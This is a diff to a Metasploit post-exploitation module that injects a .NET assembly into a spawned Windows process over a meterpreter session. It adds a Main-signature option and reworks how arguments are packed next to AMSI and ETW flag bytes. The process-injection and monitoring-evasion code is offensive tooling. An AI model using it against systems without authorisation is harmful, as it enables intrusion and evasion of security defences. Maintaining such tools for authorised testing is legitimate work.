@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Post
         'Platform' => 'win',
         'SessionTypes' => ['meterpreter'],
         'Targets' => [['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]],
-        'References' => [['URL', 'https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html']],
+        'References' => [['URL', 'https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/']],
         'DefaultTarget' => 0
       )
     )
@@ -38,6 +38,7 @@ class MetasploitModule < Msf::Post
       [
         OptPath.new('DOTNET_EXE', [true, 'Assembly file name']),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
+        OptEnum.new('Signature', [true, 'The Main function signature', 'Automatic', ['Automatic', 'Main()', 'Main(string[])']]),
         OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),
         OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation', true]),
         OptInt.new('PID', [false, 'Pid  to inject', 0]),
@@ -228,19 +229,25 @@ class MetasploitModule < Msf::Post
   def copy_assembly(exe_path, process)
     print_status("Host injected. Copy assembly into #{process.pid}...")
     int_param_size = 8
+    sign_flag_size = 1
     amsi_flag_size = 1
     etw_flag_size = 1
     assembly_size = File.size(exe_path)
-    if datastore['ARGUMENTS'].nil?
-      argssize = 1
-    else
-      if datastore['ARGUMENTS'].size == 0
-        argssize = 2
-      else
-        argssize = datastore['ARGUMENTS'].size + 1
-      end
+
+    cln_params = ""
+    case datastore['Signature']
+    when 'Automatic'
+      signature = datastore['ARGUMENTS'].blank? ? "\x01" : "\x02"
+    when 'Main()'
+      signature = "\x01"
+    when 'Main(string[])'
+      signature = "\x02"
+      cln_params << datastore['ARGUMENTS']
     end
-    payload_size = amsi_flag_size + etw_flag_size + int_param_size
+    cln_params << "\x00"
+    argssize = cln_params.length
+
+    payload_size = amsi_flag_size + etw_flag_size + sign_flag_size + int_param_size
     payload_size += assembly_size + argssize
     assembly_mem = process.memory.allocate(payload_size, PAGE_READWRITE)
     params = [assembly_size].pack('I*')
@@ -255,16 +262,8 @@ class MetasploitModule < Msf::Post
     else
       params += "\x02"
     end
-    if datastore['ARGUMENTS'].nil?
-      params += ''
-    else
-      if datastore['ARGUMENTS'].size == 0
-        params += "\x00"
-      else
-        params += datastore['ARGUMENTS']
-      end
-    end
-    params += "\x00"
+    params += signature
+    params += cln_params
 
     process.memory.write(assembly_mem, params + File.read(exe_path))
     print_status('Assembly copied.')
